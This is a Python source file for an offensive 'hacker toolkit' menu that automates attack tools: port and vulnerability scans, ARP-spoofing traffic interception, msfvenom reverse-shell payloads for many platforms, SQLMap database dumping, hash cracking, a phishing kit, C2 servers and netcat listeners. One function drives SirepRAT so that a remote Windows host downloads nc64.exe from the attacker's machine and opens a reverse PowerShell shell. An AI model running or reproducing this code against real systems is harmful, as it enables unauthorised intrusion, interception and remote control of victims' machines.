#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# x4cker kit v1.5

from prompt_toolkit import prompt
import pwnlib
import socketserver as SocketServer
import http.server
from http.server import HTTPServer as SimpleHTTPServer
from http.server import BaseHTTPRequestHandler, SimpleHTTPRequestHandler
import socket
import requests
from pwn import *
from termcolor import colored
import string
import blessed
import time
import errno
import random
import sys
import datetime
import os
import re
import fnmatch
import urllib.request
import subprocess
from time import sleep
from subprocess import Popen, PIPE
from logging import getLogger, ERROR
import threading
from colorama import Fore
from colorama import Style
import platform
from simple_term_menu import TerminalMenu
import argparse
import asyncore
import ssl
import multiprocessing
import netifaces
import prompt_toolkit



t = blessed.Terminal()
listeners = []

os.chdir(os.getcwd())

def menu(title, menu_list):
    menu = TerminalMenu(menu_list, title=title)
    selection = menu.show()
    return menu_list[selection]

def menu_with_custom_choice(title, menu_list):
    menu_list.append('Custom')
    selection = menu(title, menu_list)
    return selection


def get_options(select):
    if select == "DNS":
        parser = argparse.ArgumentParser(description='Choose From On Screen Menu', formatter_class=argparse.RawTextHelpFormatter)
        wordlists = parser.add_mutually_exclusive_group()
        wordlists.add_argument('-w', '--wordlist', dest='WORDLIST', action='store_const', const='wordlists', help='Choose Wordlist')
        options = parser.parse_args()
        menu_list = os.listdir('/root/x4c/SecLists/Discovery/DNS/')
        options.WORDLIST = menu_with_custom_choice("Choose Wordlist", menu_list)
        return options
    else:
        parser = argparse.ArgumentParser(description='Choose From On Screen Menu', formatter_class=argparse.RawTextHelpFormatter)
        wordlists = parser.add_mutually_exclusive_group()
        wordlists.add_argument('-w', '--wordlist', dest='WORDLIST', action='store_const', const='wordlists', help='Choose Wordlist')
        options = parser.parse_args()
        menu_list = os.listdir('/root/x4c/SecLists/Discovery/Web-Content/')
        options.WORDLIST = menu_with_custom_choice("Choose Wordlist", menu_list)
        return options

def x4menu():
    try:
        print('''\n
            ''' + colored('[X4CKERTOOLKIT PRO v1.5]\n', 'red', attrs=['bold']) + '''
            [1]   Scanner  
            [2]   Metasploit Automated
            [3]   MITM Sniffer              
            [4]   Private Droppers   
            [5]   Hash Identify 
            [6]   Fuff Automated  
            [7]   Shellerator  
            [8]   SQLMap                     
            [9]   XSRFProbe                   
            [10]  SMB12    
            [11]  CipherChef
            [12]  LFISuite
            [13]  Shodan
            [14]  TempMail
            [15]  JWTweak
            [16]  Phishing 
            [17]  Commix WebPT
            [18]  Hashcat Automated
            [19]  C2 Server TCP
            [20]  C2 Server SSL
            [21]  PassList Creator
            [22]  EXIT\n\n\n''')
        if len(listeners) < 1:
            select = input(colored('ROOT:', 'red', attrs=['bold']) + colored('~# ', 'white', attrs=['bold']))
        else:
            try:
                for i in range(len(listeners)):
                    print(f"\n[X] Listening on {listeners[i]}")
            except Exception as error:
                print(error)
                pass
            select = input(colored('ROOT:', 'red', attrs=['bold']) + colored('~# ', 'white', attrs=['bold']))
        select = select.replace("\n", "")
        if select == '?' or select == 'help':
            x4menu()
        if select == '1' or select == 'scan':
            netscanmenu()
        elif select == 'listener':
            lport = input("lport : ")
            decide = input("[1]  SSL\n[2]  Netcat\n\n> ")
            if "N" in decide or "n" in decide or "netcat" in decide or "2" in decide:
                xterm = subprocess.Popen(f"""xterm -geometry 100x24 -hold -e 'nc -lvnp {lport}'""", shell=True)
            else:
                xterm = subprocess.Popen(f"""xterm -geometry 100x24 -hold -e 'nc -lvnp {lport}'""", shell=True)
            x4menu()
        elif select == 'netcat':
            lport = input("lport : ")
            xterm = subprocess.Popen(f"""xterm -geometry 100x24 -hold -e 'nc -lvnp {lport}'""", shell=True)
            x4menu()
        elif select == '21' or select == 'exit':
            print("\n--- BY3 By3 ---\n")
            exit()
        elif select == '20':
            xterm = subprocess.Popen("""xterm -geometry 100x24 -hold -e 'cd /root/Winpayloads/ && python WinPayloads.py'""",shell=True)
            x4menu()
        elif select == '21':
            xterm = subprocess.Popen("""xterm -geometry 100x24 -hold -e 'cd /root/x4c/elpscrk/ && python3 elpscrk.py --leet --level 3 --chars --years 1960'""",shell=True)
            x4menu()
        elif select == '2':
            msf()
        elif select == "18":
            print(f"\n{colored('Hashcat Rule Set to : OneRuleToRuleThemAll.', 'red')}\n")
            location = input("Input Hash to Crack or Location : ").replace("\n", "")
            hashtype = input("Input Hash Type (Number) : ").replace("\n","")
            xterm = subprocess.Popen(['xterm', '-hold', '-e', f'hashcat -m {hashtype} {location} -r /root/x4c/Optimised-hashcat-Rule/OneRuleToRuleThemAll.rule /root/x4c/SecLists/Passwords/Leaked-Databases/rockyou.txt'])
            x4menu()
        elif select == "22":
            r = listen((input("lport : ").replace("\n", "")))
            we_listen(r)

        elif select == 'banner':
            print("\n\n\n")
            x4menu()
        elif select == '3':
            sslsniffer()
        elif select == '5':
            hashbruter()
        elif select == '8':
            sqlmap()
        elif select == '6' or select == 'url':
            subd()
        elif select == '9':
            xsrf()
        elif select == '10':
            target = input("Type Target : ").replace("\n", "")
            os.system(f'python /root/x4c/x4ckertoolkit/smb12.py {target}')
            input(colored('\n[+] Press any key to continue...\n', 'red', attrs=['bold']))
            x4menu()
        elif select == '11':
            os.system('service apache2 start')
            tester = subprocess.Popen([f"google-chrome", "--no-sandbox", "http://localhost/cychef.html"], stderr=subprocess.PIPE,stdin=subprocess.PIPE, stdout=subprocess.PIPE)
            print("\n", "")
            x4menu()
        elif select == '12':
            tester = subprocess.Popen("""xterm -geometry 100x24 -hold -e 'python /root/LFISuite/lfisuite.py'""",shell=True)
            x4menu()
        elif select == '7':
            tester = subprocess.Popen("""xterm -geometry 100x24 -hold -e 'python3 /root/shellerator/shellerator.py'""", shell=True)
           # os.system(f'cd /root/x4c/x4ckertoolkit/mosint/ && python3 mosint.py')
            x4menu()
        elif select == '13':
            test = input("Input Search Term : ").replace("\n", "")
            try:
                if int(test[0:2]) <= 99:
                    testor = subprocess.Popen(f"xterm -geometry 100x24 -T 'SHODAN' -hold -e 'shodan host {test}'", shell=True)
                    x4menu()
            except ValueError:
                testor = subprocess.Popen(f"xterm -geometry 100x24 -T 'SHODAN' -hold -e 'shodan search --fields=info,port,ip_str,os {test}'", shell=True)
                x4menu()
        elif select == '14':
            testor = subprocess.Popen("xterm -geometry 100x24 -T 'TEMPOMAIL' -hold -e 'tempomail'", shell=True)
            x4menu()
        elif select == '15':
            testor = subprocess.Popen(f"xterm -geometry 100x24 -T 'SCRYING' -hold -e 'python3 /root/JWTweak/JWTweak.py'", shell=True)
            x4menu()
        elif select == '16':
            testor = subprocess.Popen(f"xterm -geometry 100x24 -T AdvPhishing -hold -e 'cd /root/AdvPhishing/ && bash AdvPhishing.sh'", shell=True)
            x4menu()
        elif select == '4':
            testor = subprocess.Popen(f"gnome-terminal -e '/root/PycharmProjects/pythonProject1/venv/bin/python /root/PycharmProjects/pythonProject1/pwner.py'", stderr=subprocess.PIPE, stdin=subprocess.PIPE, stdout=subprocess.PIPE,shell=True)
            x4menu()
        elif select == '17':
            urli = input("Input URL(HTTPS/HTTP) : ").replace("\n", "")
            testor = subprocess.Popen(f"xterm -geometry 100x24 -T COMMIX -hold -e 'commix -u {urli} --random-agent --level 3'",shell=True)
            x4menu()
        elif select == '19':
            testor = subprocess.Popen(f"gnome-terminal -e 'Platypus_linux_amd64'", stderr=subprocess.PIPE, stdout=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
            x4menu()
        else:
            print("\nInvalid Input, Please Select from the Following Options.")
            sleep(0.1)
            x4menu()
    except KeyboardInterrupt:
        sleep(0.1)
        print("\n Script Made for PRV Use - Restarting\n")
        banner()
        x4menu()

def netscanmenu():
    select = input('\n[1]   X4 QUICK NETWORK TRACEROUTE\n[2]   X4 TARGET SCANNER\n[3]   BACK\n\n' + colored('ROOT:', 'red', attrs=['bold']) + colored('~# ', 'white', attrs=['bold']))
    select = select.replace("\n", "")
    if select == '2':
        print("\nWith Great Power Comes Great Responsibility.\n")
        targetscan()
    if select == '99':
        netdis()
    if select == '1':
        tracer()
    if select == '0' or select =='3':
        x4menu()
    if select != '0' or select != '1' or select != '2' or select != '3' or select != '4':
        print("Invalid Input - Going Back...")
        sleep(1)
        netscanmenu()

def targetscan():
    target = input("[X4] Please Enter Target: ")
    target.replace("\n", "")
    os.system(f'sudo nmap --open -p- -vv {target}')
    print("\nFINISHED!")
    portscaner = input("\n[X4] Deep Port Scan ? (y/n) : ")
    portscaner = portscaner.replace("\n", "")
    if portscaner == 'y' or portscaner == 'yes':
        portnum = input("[X4] Type Ports , (Ex: 21,22,445) : ")
        portnum = portnum.replace("\n", "")
        xterm = subprocess.Popen(['xterm', '-hold', '-e', f'nmap -sV -sC --script=default,vuln -p{portnum} -v {target}'])
        sleep(1)
        x4menu()
    else:
        x4menu()
    x4menu()

def sslsniffer():
    print("\nAvailable Devices: \n")
    os.system("ifconfig | grep 'eth\|tun'")
    inttt = input("\n[X4]  Choose Your Interface : ")
    up_interface = str(inttt)
    up_interface = up_interface.replace("\n", "")
    print("\n")
    os.system(f"route -n | grep {up_interface}")
    gateway = input("\n[X4]  Enter Your Default Gateway : ").replace("\n", "")
    target_ips = input("[X4] Enter Target IP Address : ").replace("\n", "")
    print(f"[++] All logs are saved on : /opt/x4ckerkit/x4ckersniff")
    print(f"[++] Sniffing on {target_ips}")
    print("\n[++] Press 'Ctrl + C'  Once In This Window to stop . \n")
    xterm = subprocess.Popen(f"""xterm -geometry 100x24 -T 'arpspoof' -hold -e 'arpspoof -i {up_interface} -c both -t {target_ips} -r {gateway}'""", shell=True)

    xterm2 = subprocess.Popen(['xterm', '-hold', '-e', f'wireshark -i {up_interface} -Y "ip.src == {target_ips} or ip.dst == {target_ips}" -k'])

    xterm2.communicate()

    x4menu()

def tracer():
    print("[++] Sudo Rights are Needed for this Scan [++]")
    trgt = input("[X4] Type Range to Scan (Ex: 10.0.0.0/24) : ")
    os.system(f'sudo nmap -sn --traceroute {trgt}')
    sleep(0.5)
    netscanmenu()

def hashbruter():
    hashed = input("Type HASH: ")
    os.system(f'hash-identifier {hashed}')
    input("\nPress any Key to continue...\n")
    x4menu()

def msf():
    payload = input('''[1] APK
[2] ASP
[3] ASPX
[4] Bash[.sh]
[5] Java[.jsp]
[6] Linux[.elf]
[7] OSX[.macho]
[8] Perl[.pl]
[9] PHP
[10] Powershell[.ps1]
[11] Python[.py]
[12] Tomcat[.war]
[13] Windows[.exe //.exe //.dll]
[14] Pure Shellcode
[15] BACK\n\n''' + colored('ROOT:PAYLOADS:', 'red', attrs=['bold']) + colored('~# ', 'white', attrs=['bold']))
    badchars = b'\x00\x01\x02\x80\xFF\xFC\x0F\x14'
    payload = payload.replace("\n", "")
    if payload == '1':
        lhost = input("Input LHOST: ").replace("\n", "")
        os.system(f"msfvenom -p android/meterpreter/reverse_tcp {lhost} lport=4444 > android_shell.apk")
        print("File Written - android_shell.apk\n")
        input("Press Any Key To Continue...\n")
        msf()
    elif payload == '2':
        lhost = input("Input LHOST: ").replace("\n", "")
        os.system(f"msfvenom -p windows/shell_reverse_tcp LHOST={lhost} LPORT=4444 -b {badchars} -f asp > shell.asp")
        print("File Written - shell.asp\n")
        input("Press Any Key To Continue...\n")
        msf()
    elif payload == '3':
        lhost = input("Input LHOST: ").replace("\n", "")
        os.system(f"msfvenom -p windows/shell_reverse_tcp LHOST={lhost} LPORT=4444 -b {badchars}-f asp > shell.aspx")
        print("File Written - shell.aspx\n")
        input("Press Any Key To Continue...\n")
        msf()
    elif payload == '4':
        lhost = input("Input LHOST: ").replace("\n", "")
        os.system(f"msfvenom -p cmd/unix/reverse_bash LHOST={lhost} LPORT=4444 -b {badchars} -f raw > shell.sh")
        print("File Written - shell.sh\n")
        input("Press Any Key To Continue...\n")
        msf()
    elif payload == '5':
        lhost = input("Input LHOST: ").replace("\n", "")
        os.system(f"msfvenom -p java/jsp_shell_reverse_tcp LHOST={lhost} LPORT=4444 -b {badchars}-f raw > shell.jsp")
        print("File Written - shell.jsp\n")
        input("Press Any Key To Continue...\n")
        msf()
    elif payload == '6':
        lhost = input("Input LHOST: ").replace("\n", "")
        os.system(f"msfvenom -p linux/x86/shell_reverse_tcp LHOST={lhost} LPORT=4444 -b {badchars} -f elf > shell.elf")
        print("File Written - shell.elf\n")
        input("Press Any Key To Continue...\n")
        msf()
    elif payload == '7':
        lhost = input("Input LHOST: ")
        os.system(f"msfvenom -p osx/x86/shell_reverse_tcp LHOST={lhost} LPORT=4444 -b {badchars} -f macho > shell.macho")
        print("File Written - shell.macho\n")
        input("Press Any Key To Continue...\n")
        msf()
    elif payload == '8':
        lhost = input("Input LHOST: ").replace("\n", "")
        os.system(f"msfvenom -p cmd/unix/reverse_perl LHOST={lhost} LPORT=4444 -b {badchars} -f raw > shell.pl")
        print("File Written - shell.pl\n")
        input("Press Any Key To Continue...\n")
        msf()
    elif payload == '9':
        lhost = input("Input LHOST: ").replace("\n", "")
        os.system(f"msfvenom -p php/meterpreter_reverse_tcp LHOST={lhost} LPORT=4444 -b -f php > shell.php")
        print("File Written - shell.php\n")
        input("Press Any Key To Continue...\n")
        msf()
    elif payload == '10':
        lhost = input("Input LHOST: ")
        os.system(f"msfvenom -p windows/shell_reverse_tcp LHOST={lhost} LPORT=4444 -f psh > shell.ps1")
        print("File Written - shell.ps1\n")
        input("Press Any Key To Continue...\n")
        msf()
    elif payload == '11':
        lhost = input("Input LHOST: ").replace("\n", "")
        os.system(f"msfvenom -p windows/shell_reverse_tcp LHOST={lhost} LPORT=4444 -b {badchars} -f raw > shell.py")
        print("File Written - shell.py\n")
        input("Press Any Key To Continue...\n")
        msf()
    elif payload == '12':
        lhost = input("Input LHOST: ").replace("\n", "")
        os.system(f"msfvenom -p java/jsp_shell_reverse_tcp LHOST={lhost} LPORT=4444 -b -f war > shell.war")
        print("File Written - shell.war\n")
        input("Press Any Key To Continue...\n")
        msf()
    elif payload == '13':
        lhost = input("Input LHOST: ")
        os.system(f"msfvenom -p windows/shell_reverse_tcp LHOST={lhost} LPORT=4444 -f exe > shell.exe")
        print("File Written - shell.exe\n")
        input("Press Any Key To Continue...\n")
        msf()
    elif payload == '14':
        lhost = input("input LHOST: ").replace("\n", "")
        lport = input("Input LPORT: ").replace("\n", "")
        format = input("Input Format: ").replace("\n", "")
        os.system(f"msfvenom -p windows/shell_reverse_tcp lhost={lhost} lport={lport} -f {format} -b {badchars}")
        print("\n")
        input("Press Any Key To Continue...\n")
        msf()
    elif payload == '15':
        x4menu()

def sireprat():
    choice = input("Send or Activate[S,A,E]? ")
    choice = choice.replace("\n", "")
    if choice == 'S':
        rhost = input("Input RHOST: ").replace("\n", "")
        lhost = input("Input LHOST: ").replace("\n", "")
        os.system(f'python /root/SirepRAT/SirepRAT.py {rhost} LaunchCommandWithOutput --return_output --cmd "C:\\Windows\\System32\\cmd.exe" --args "/c powershell Invoke-Webrequest --OutFile C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe -Uri http://{lhost}:80/nc64.exe" --v')

    if choice == 'A':
        print("[X] --- Starting Listener Port 4444 --- [X]\n")
        rhost = input("Input RHOST: ").replace("\n", "")
        lhost = input("Input LHOST: ").replace("\n", "")
        os.system(f'python /root/SirepRAT/SirepRAT.py {rhost} LaunchCommandWithOutput --return_output --cmd "C:\\Windows\\System32\\cmd.exe" --args "/c C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe {lhost} 4444 --e powershell.exe" --v')
        listener = listen(4444)
        try:
            if listener.wait_for_connection().settimeout(timeout=18):
                listener.interactive()
                listener.close()
            else:
                listener.close()
                print("Exploit failed.")
                x4menu()
        except AttributeError:
            listener.close()
            print("Exploit Failed")
            x4menu()
        except OSError:
            print(OSError)
            print("Port Already Binded")
            x4menu()
    if choice == "E":
        x4menu()
    else:
        print("Wrong Input")
        sireprat()

def sqlmap():
    select = input("Request or URL ? (r,u)\n" + colored('ROOT:', 'red', attrs=['bold']) + colored('SQLMAP > ', 'white')).replace("\n","")
    if select == "r" or select == "req" or select == "request":
        url = input("Input BURP Post Requset File : ").replace("\n", "")
        xterm = subprocess.Popen(['xterm', '-hold', '-e', f'sqlmap -r {url} --level=2 --risk=2 --random-agent --dump'])
        sleep(1)
        x4menu()
    elif select == "u" or select == "url":
        url = input("Input URL: ").replace("\n", "")
        xterm = subprocess.Popen(['xterm', '-hold', '-e', f'sqlmap -u {url} --level=2 --risk=2 --random-agent --forms --crawl 2 --dump'])
        sleep(1)
        x4menu()
    else:
        print("Invalid Option")
        sqlmap()

def xsrf():
    url = input("Input URL : ").replace("\n", "")
    if url[-1] == "/":
        xterm = subprocess.Popen(['xterm', '-hold', '-e', f'xsrfprobe -u {url}'])
    else:
        url = url + "/"
        xterm = subprocess.Popen(['xterm', '-hold', '-e', f'xsrfprobe -u {url}'])
    sleep(1)
    x4menu()

def banner():
    print("""
                        ██╗  ██╗██╗  ██╗ ██████╗
                        ╚██╗██╔╝██║  ██║██╔════╝
                         ╚███╔╝ ███████║██║     
                         ██╔██╗ ╚════██║██║     
                        ██╔╝ ██╗     ██║╚██████╗
                        ╚═╝  ╚═╝     ╚═╝ ╚═════╝
                            PRV Framework
                          Type "?" for Menu.       
                          
                          
                          
                          
                                      
""")

def subd():
    global custom_wordlist
    print("[X] - Input FUZZ in the chosen place. - [X]\n")
    print("[X] - Exmaple: https://FUZZ.jjisrael.com - [X]\n")
    url = input("Input URL (http/https): ").replace("\n", "")
    filter_words = input("Input MW (Filter Results by Amount of Words - Ex: 10-40000): ").replace("\n", "")
    ignore_code = input("Input Response Codes Saparated by Comma to Ignore or Leave Empty :").replace("\n", "")
    if len(ignore_code) >= 2:
        pass
    else:
        ignore_code = "400"
    if len(filter_words) >= 1:
        pass
    else:
        filter_words = "10"
    url = url.replace("\n", "")
    if "FUZZ" in url:
        if url[-4:] == "FUZZ" or "FUZZ" in url[-7:]:
            agression = input("(A)gressive or (C)ustom Wordlist? ")
            if "C" in agression or "c" in agression:
                custom_wordlist = get_options("TEST")
                xterm = subprocess.Popen(f"""xterm -geometry 100x24 -T 'FUZZER' -hold -e 'ffuf -c -ic -w /root/x4c/SecLists/Discovery/Web-Content/{custom_wordlist.WORDLIST} -u {url} -mw {filter_words} -fc 404,429,{ignore_code} -recursion -recursion-depth 3 -H "User-Agent: Im4Ph0n3_Bu7n07r34lly"'| GREP_COLOR='01;36' grep --color=always -E '|200|INFO|301|$' > /dev/null 2>&1 &""", shell=True)
            else:
                xterm = subprocess.Popen(f"""xterm -geometry 100x24 -T 'FUZZER' -hold -e 'ffuf -c -ic -w /root/x4c/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -u {url} -mw {filter_words} -fc 404,429,{ignore_code} -recursion -recursion-depth 3 -H "User-Agent: Im4Ph0n3_Bu7n07r34lly"'| GREP_COLOR='01;36' grep --color=always -E '|200|INFO|301|$' > /dev/null 2>&1 &""", shell=True)
            sleep(1)
            x4menu()
        else:
            if "http://" in url:
                urlfuzz = url.replace("FUZZ.", "").replace("\n", "")
                urlstrip = url.replace("http://", "").replace("\n", "")
                agression = input("(A)gressive or (C)ustom Wordlist? ")
                if "A" in agression or "a" in agression:
                        xterm = subprocess.Popen(f"""xterm -geometry 100x24 -T 'FUZZER' -hold -e 'ffuf -ic -c -w /root/x4c/SecLists/Discovery/DNS/dns-Jhaddix.txt -u {urlfuzz} -H "Host: {urlstrip}" -mw {filter_words} -fc 404,429,{ignore_code}'| GREP_COLOR='01;36' grep --color=always -E '|200|INFO|301|$' > /dev/null 2>&1 &""", shell=True)
                else:
                    if "C" in agression or "c" in agression or "" in agression:
                        custom_wordlist = get_options("DNS")
                        xterm = subprocess.Popen(f"""xterm -geometry 100x24 -T 'FUZZER' -hold -e 'ffuf -ic -c -w /root/x4c/SecLists/Discovery/DNS/{custom_wordlist.WORDLIST} -u {urlfuzz} -H "Host: {urlstrip}" -mw {filter_words} -fc 404,429,{ignore_code}'| GREP_COLOR='01;36' grep --color=always -E '|200|INFO|301|$' > /dev/null 2>&1 &""",shell=True)
            elif "https://" in url:
                url.replace("\n", "")
                urlstrip = url.replace("https://", "").replace("\n", "")
                urlfuzz = url.replace("FUZZ.", "").replace("\n", "")
                agression = input("(A)gressive or (C)ustom Wordlist? ")
                if "A" in agression or "a" in agression:

                    xterm = subprocess.Popen(f"""xterm -geometry 100x24 -T 'FUZZER' -hold -e 'ffuf -ic -c -w /root/x4c/SecLists/Discovery/DNS/dns-Jhaddix.txt -u {urlfuzz} -H "Host: {urlstrip}" -mw {filter_words} -fc 404,429,{ignore_code}'| GREP_COLOR='01;36' grep --color=always -E '|200|INFO|301|$' > /dev/null 2>&1 &""",shell=True)
                else:
                    if "C" in agression or "c" in agression or "" in agression:
                        custom_wordlist = get_options("DNS")
                        xterm = subprocess.Popen(f"""xterm -geometry 100x24 -T 'FUZZER' -hold -e 'ffuf -ic -c -w /root/x4c/SecLists/Discovery/DNS/{custom_wordlist.WORDLIST} -u {urlfuzz} -H "Host: {urlstrip}" -mw {filter_words} -fc 404,429,{ignore_code}'| GREP_COLOR='01;36' grep --color=always -E '|200|INFO|301|$' > /dev/null 2>&1 &""",shell=True)
            else:
                print("\n[X] Please Type HTTP or HTTPS[X]\n")
                sleep(1)
                subd()
            sleep(1)
            x4menu()
    else:
        print("\n[X] Please Type FUZZ in the Desired Location [X]\n")
        sleep(1)
        subd()


if __name__ == '__main__':
    getLogger("scapy.runtime").setLevel(ERROR)
    try:
        #thtest = threading.Thread(target=getAndRunMainMenu())
        thmenu = threading.Thread(target=x4menu())
        thmenu.daemon = True
        thmenu.start()



    except KeyboardInterrupt:
        sleep(1)
        print("\n Script Made for PRV Use - Restarting\n")
        banner()
        x4menu()
